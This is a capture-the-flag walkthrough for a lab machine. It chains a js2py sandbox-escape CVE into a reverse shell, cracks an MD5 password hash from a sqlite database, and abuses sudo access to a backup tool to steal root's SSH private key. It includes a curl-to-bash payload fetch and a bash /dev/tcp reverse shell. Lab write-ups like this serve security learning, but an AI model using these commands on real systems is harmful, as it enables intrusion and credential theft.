# CodePardTwo Writeup

#1 Nmap
$ sudo nmap -p- -sC -sV --min-rate 1000 10.129.3.110  

22(ssh), 8000(http) is open  
  
visit 8000 via browser, and now we find website is running.  
  
we can download app by clicking "DOWNLOAD APP"  
  
$ unzip app.zip  
$ cd app  
$ la -la  
  
there is requiments.txt, which tell us the version of "js2py" is 0.74  
->CVE-2024-28397  
  
we can run js code on the website, so get scripthttps://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape/blob/main/poc.py  
  
edit the script to excecute the code   
 curl http://{our ip}:8080/shell.sh |bash  
  
make the following reverse shell  
$ cat shell.sh  
#!/bin/bash  
bash -i >& /dev/tcp/{our ip}/1234 0>&1  
  
$ python3 -m http.server 8080  
$ nc -lnvp 1234  
  
now, we can execute the CVE script on the website, and we get reverse shell  
  
codeparttwo) pwd  
~/app/instance  
  
codeparttwo) ls -la  
-> we can find "users.db"  
get information of users.db by using "find" command.  
code parttwo) find users.db  
-> now, we know sqlite is used.  
codeparttwo) sqlite3 users.db  
sqlite> .tables  
-> we can show tables with the command, and we find two tables code_snippet, user  
sqlite> select * from user;  
we get username: marco, and password hash!!  
  
copy the hash to our attacker machine, and hashid {hash}  
-> the hash is seems MD5  
john --format-type=raw-md5 hash.txt  
we can get password !!  
so, get into the target machine with marco's credentials,  
  
[+] get user flag!! [+]  
  
  
##3 root flag  
marco) sudo -l  
-> marco can run npbackup-cli as admin.  
with npbackup-cli, we can create backups with root directory  
so, backup /root direcotory -> get ssh rsa_key of root  
marco) npbackup.conf npbackup_cp.conf  
marco) nano npbackup.conf  
edit paths of backup: "/root"  
  
marco) sudo /usr/local/bin/npbackup-cli -c npbackup_cp.conf -b -f  
now, we have root directory backup.  
marco) sudo /usr/local/bin/npbackup-cli -c npbackup_cp.conf --ls  
there is ssh private key  
marco) sudo /usr/local/bin/npbackup-cli -c npbackup_cp.conf --duump /root/.ssh/id_rsa     
copy the output to local file 'id_rsa'  
ssh require that private key file is only be readabl/writable by file's creator.  
$ chmod 600 id_rsa  
$ ssh -i id_rsa root@{target ip}  
  
now, we get root shell and root flag!!  

